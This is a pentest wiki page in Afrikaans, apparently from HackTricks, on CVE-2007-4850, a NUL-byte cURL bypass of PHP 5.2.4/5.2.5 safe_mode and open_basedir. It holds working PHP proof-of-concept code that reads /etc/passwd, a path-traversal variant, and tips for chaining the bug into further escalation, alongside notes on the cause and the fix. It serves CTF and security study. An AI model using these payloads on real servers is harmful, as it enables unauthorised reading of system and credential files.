# PHP 5.2.4 and 5.2.5 PHP cURL

{{#include ../../../../banners/hacktricks-training.md}}

Hierdie blad dokumenteer 'n verouderde maar steeds nuttige truuk in CTFs/local-legacy-installs om PHP safe_mode/open_basedir kontroles te omseil deur die cURL extension op spesifieke PHP 5.2.x builds te gebruik.

- Getroffen: PHP 5.2.4 en 5.2.5 met ext/curl geaktiveer.
- Impak: Lees arbitrêre plaaslike lêers ondanks safe_mode of open_basedir beperkings (geen direkte kode-uitvoering nie).
- ID: CVE-2007-4850.

Bron: http://blog.safebuff.com/2016/05/06/disable-functions-bypass/

## Eenreël PoC

As safe_mode of open_basedir aktief is en cURL geaktiveer is, sal die volgende die inhoud van die huidige skrip teruggee:
```php
var_dump(curl_exec(curl_init("file://safe_mode_bypass\x00".__FILE__)));
```
## Meer eksplisiete PoC (arbitrary file read)
```php
<?php
// Preconditions (legacy): PHP 5.2.4/5.2.5, safe_mode or open_basedir enabled, ext/curl loaded
$target = '/etc/passwd'; // change to the file you want to read
$ch = curl_init();
// The trick is the NUL byte (\x00). Prefix can be any string; checks are confused and the file after the NUL is read.
curl_setopt($ch, CURLOPT_URL, 'file://prefix'.chr(0).$target);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$resp = curl_exec($ch);
$err  = curl_error($ch);
curl_close($ch);
if ($resp !== false) {
echo $resp; // should contain the target file
} else {
echo "cURL error: $err\n";
}
?>
```
Notas:
- Gebruik dubbele aanhalingstekens of chr(0) om 'n regte NUL-byte in te voeg. Percent-encoding (%00) sal nie betroubaar werk nie.
- Dit is 'n file read primitive. Kombineer met ander primitives (log poisoning, session file inclusion, etc.) vir verdere eskalasie waar moontlik.

## Waarom dit werk (kort)

Die kwetsbaarheid lê in hoe PHP 5.2.4/5.2.5 safe_mode/open_basedir kontroles vir file:// URLs in ext/curl uitgevoer het. Die kontrole het die URL geparseer en 'n padkomponent gevalideer, maar as gevolg van NUL-byte hantering het dit 'n ander string gevalideer as die een wat werklik deur libcurl gebruik is. In praktyk kon die validator die pad ná die NUL goedkeur terwyl libcurl die deel vóór die NUL as die URL-container gebruik het, wat 'n omseiling moontlik maak wat lei tot die lees van die lêer wat ná die NUL-byte geplaas is. Sien die oorspronklike ontleding en die geaffekteerde makro in curl/interface.c vir besonderhede. [CVE-2007-4850].

## Beperkings en regstellings

- Fixed in later 5.2.x (e.g., distro builds patched to 5.2.6) deur die parsing/validation in ext/curl reg te stel.
- Beïnvloed slegs baie ou PHP-implementasies; safe_mode is verwyder in PHP 5.4 en moderne builds toon nie hierdie gedrag nie.

## Verwante historiese cURL-based bypasses

- CVE-2006-2563 (PHP 4.4.2/5.1.4): libcurl wrappers het `file://` toegang met ingeslote NULs toegelaat om open_basedir te omseil; reggestel voor 5.2.x.
- PHP bugs #30609/#36223 het vroeë cURL open_basedir-kwessies opgespoor wat `file://` sonder kanonisering gebruik het. Enige kontrole voor die NUL-byte of sonder `realpath`-styl resolusie is vatbaar vir dieselfde afkapping.

## CTF wenke

- Wanneer jy PHP 5.2.4/5.2.5 met ext/curl geladen identifiseer (kyk vir `cURL support => enabled` in `phpinfo()` en die presiese `PHP Version`), werk hierdie truuk gewoonlik selfs al is `allow_url_fopen` gedeaktiveer omdat ext/curl self `file://` hanteer.
- As direkte paaie geblokkeer is, probeer relatiewe traversering na die NUL, e.g. `file://x\x00../../../../etc/passwd`. Die traversering word deur libcurl opgelos, nie deur die open_basedir-beskerming nie.
- Jy kan die payload in 'n enkele HTTP request body verpak om die LFI te trigger deur kwesbare server-side kode wat user-controlled URLs na `curl_exec()` spiegel (algemeen in legacy SSRF-like endpoints).

## Sien ook

Other disable_functions/open_basedir bypasses and modern techniques are collected here:

{{#ref}}
README.md
{{#endref}}

## References

- [Ubuntu CVE entry with patch pointers and affected versions](https://ubuntu.com/security/CVE-2007-4850)
- [Technical writeup with code context (cxsecurity)](http://cxsecurity.com/issue/WLB-2008010060)
- [PHP bug #36223 (curl bypasses open_basedir)](https://bugs.php.net/bug.php?id=36223)
- [CVE-2006-2563 cURL PHP File Access Bypass (earlier NUL-byte issue)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2563)
{{#include ../../../../banners/hacktricks-training.md}}
